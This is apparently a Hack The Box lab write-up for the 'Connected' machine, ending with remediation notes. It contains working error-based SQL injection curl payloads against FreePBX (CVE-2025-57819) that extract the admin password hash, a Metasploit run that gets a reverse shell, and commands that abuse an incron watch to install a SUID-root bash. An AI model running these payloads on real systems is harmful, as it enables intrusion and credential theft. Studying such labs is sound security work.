# HTB — Connected

**Platform:** Hack The Box
**Machine:** Connected
**OS:** Linux (CentOS)
**Difficulty:** Easy
**Target IP:** 10.129.137.93 (rotated across sessions)

---

## Summary

Foothold on this box comes from an outdated **FreePBX 16.0.40.7** instance
exposed over HTTP/HTTPS. It is vulnerable to **CVE-2025-57819**, an
unauthenticated SQL injection in the `brand` parameter of the endpoint
module's AJAX handler. The injection is used error-based to leak the FreePBX
admin credential hash, and then — via the public Metasploit module — chained
into unauthenticated remote code execution, returning a shell as the
`asterisk` service user and the user flag. Privilege escalation is achieved
through an **incron** watch that runs a root-owned init script, which sources
an attacker-writable config file (`/etc/dahdi/init.conf`); writing a payload
there and triggering the watch drops a SUID-root bash and yields root.

**Attack chain:** FreePBX fingerprint → CVE-2025-57819 unauth SQLi
(`brand` param) → admin hash leak → `freepbx_unauth_sqli_to_rce` (shell as
`asterisk`) → incron watch on a world-writable config sourced by a root-run
init script → SUID bash → root.

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sV 10.129.137.93
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

**Observations:**

- **22/tcp — SSH (OpenSSH 7.4):** Standard access route if credentials can
  be obtained. 7.4 is consistent with a CentOS 7-era host.
- **80/tcp — HTTP (Apache 2.4.6, CentOS, PHP 7.4.16):** The CentOS + Apache
  2.4.6 + PHP 7.4 stack points at CentOS 7. The PHP presence means a dynamic
  web application worth enumerating.
- **443/tcp — HTTPS:** The same Apache/PHP application served over TLS.

---

## 2. Enumeration — Web Application

Browsing the web application reveals it is running **FreePBX 16.0.40.7**, a
web GUI for the Asterisk PBX. This version is vulnerable to
**CVE-2025-57819** — an unauthenticated SQL injection in the `brand`
parameter of the endpoint module's AJAX endpoint, which can be chained to
remote code execution.

```bash
# injection point
/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<INJECT>
```

### Confirming the injection (error-based)

An error-based payload using `EXTRACTVALUE` leaks `USER()`, confirming the
SQL injection fires:

```bash
curl -i -k "https://10.129.137.93/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

### Dumping admin credentials

FreePBX stores admin logins in the `ampusers` table (`username`,
`password_sha1`) of the `asterisk` database. The same injection extracts
them. `EXTRACTVALUE` truncates its output at **32 characters** while a SHA1
hash is **40 hex characters**, so the hash is pulled in two pieces with
`SUBSTRING` and concatenated:

```bash
# hash chars 1-31, then 31-40
curl -sk ".../brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+SUBSTRING(password_sha1,1,31)+FROM+ampusers+LIMIT+1),'~'))+--+"
curl -sk ".../brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+SUBSTRING(password_sha1,31,10)+FROM+ampusers+LIMIT+1),'~'))+--+"
```

**Credential recovered:**

```
admin : 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a   (raw-sha1)
```

**Takeaway:** error-based SQLi only exfiltrates data; it cannot itself
execute code. The leaked hash confirms database access, but the path to a
shell is the RCE half of the same CVE.

---

## 3. Foothold — FreePBX Unauthenticated RCE (CVE-2025-57819)

Rather than crack the hash, the public Metasploit module turns the same SQL
injection into code execution. It injects a cronjob via the SQLi and waits
for cron to trigger a reverse shell:

```bash
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS 10.129.137.93
set LHOST <tun0 IP>
set LPORT 4444
run
```

The first run planted the cronjob but returned no session:

```
[+] Created cronjob with job name: 'puhyS'
[*] Waiting for cronjob to trigger...
[*] Exploit completed, but no session was created.
```

**Cause:** the attacker-side firewall was blocking **incoming** connections,
so the target's reverse callback never reached the handler. Allowing inbound
on port 4444 from the `tun0` (HTB VPN) interface fixed it, and re-running the
module produced a shell as the `asterisk` service user:

```bash
id
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

The user flag was read from the home directory:

```bash
cat /home/asterisk/user.txt
```

```
user.txt: [REDACTED]
```

---

## 4. Privilege Escalation — incron + Writable Init Script

### Initial checks (no path found)

`sudo -l` required a password for `asterisk` (unknown), so it was a dead end.
A SUID search and capability enumeration surfaced some unusual binaries:

```bash
sudo -l                                   # prompts for asterisk's password -> blocked
getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

The standout was `/usr/bin/staprun` (SystemTap) being SUID, but it was a
dead end — its permissions restrict execution to the `stapusr` group, and
`asterisk` is not a member:

```bash
ls -la /usr/bin/staprun
# ---s--x---. 1 root stapusr ... /usr/bin/staprun   -> "Permission denied" as asterisk
```

### Finding the incron trigger

FreePBX ships **incron** watches. The system incron table registers paths
that, when written, cause **incrond (running as root)** to execute a handler:

```bash
cat /etc/incron.d/*
# /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Writing to `/var/spool/asterisk/sysadmin/dahdi_restart` makes root run
`/usr/sbin/sysadmin_dahdi_restart`, which restarts the DAHDI init script:

```bash
strings /usr/sbin/sysadmin_dahdi_restart
# #!/bin/sh
# /etc/init.d/asterisk stop
# /etc/init.d/dahdi restart
```

`/etc/init.d/dahdi` **sources** a config file that is writable by `asterisk`:

```bash
grep -n "init.conf" /etc/init.d/dahdi
# 69: [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
ls -l /etc/dahdi/init.conf
# -rw-r--r--. 1 asterisk asterisk ... /etc/dahdi/init.conf
```

Because a root-run script sources a file `asterisk` can write, any shell
command placed in that file executes as root.

### Exploitation

Append a payload that installs a SUID-root copy of bash, then trigger the
incron watch:

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

Incrond (root) runs the init chain, sources the config, and executes the
`install` command as root, dropping a SUID-root bash:

```bash
ls -la /home/asterisk/pwn1
# -rwsr-xr-x 1 root root ... /home/asterisk/pwn1
/home/asterisk/pwn1 -p
id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

With an effective UID of 0, the root flag was read:

```bash
cat /root/root.txt
```

```
root.txt: [REDACTED]
```

---

## 5. Loot

| Type        | Value                                                          |
|-------------|----------------------------------------------------------------|
| Credentials | `admin:05c689686a4fad5ce3ec76e7ae5708b1fe2da43a` (raw-sha1)     |
| User flag   | `[REDACTED]`                                                   |
| Root flag   | `[REDACTED]`                                                   |

---

## 6. Remediation Notes

- **Unpatched FreePBX (CVE-2025-57819):** Upgrade past the fixed release. The
  endpoint module's `brand` parameter must be parameterized so user input
  cannot alter the SQL query. Restrict the `/admin/` interface to a management
  VPN or allowlisted IPs rather than exposing it to the internet.
- **Weak credential storage:** Admin passwords are stored as unsalted SHA1.
  Use a modern, salted password hash, and rotate the admin and database
  credentials after patching.
- **Root-run script sourcing a writable file:** `/etc/init.d/dahdi` sources
  `/etc/dahdi/init.conf`, which is writable by the low-privileged `asterisk`
  user. Config files evaluated by root-run scripts must not be writable by
  unprivileged accounts; set `root`-only ownership and `0644` or stricter.
- **Unprivileged-triggerable incron watches:** incron handlers run as root but
  are triggered by writes to paths the `asterisk` user controls. Scope
  triggers so an unprivileged user cannot cause privileged code to run, and
  validate anything those handlers execute.
- **Unnecessary SUID binaries:** Remove SUID where it is not required (e.g.
  `staprun`) so a future misconfiguration (such as adding a user to
  `stapusr`) does not become an escalation path.
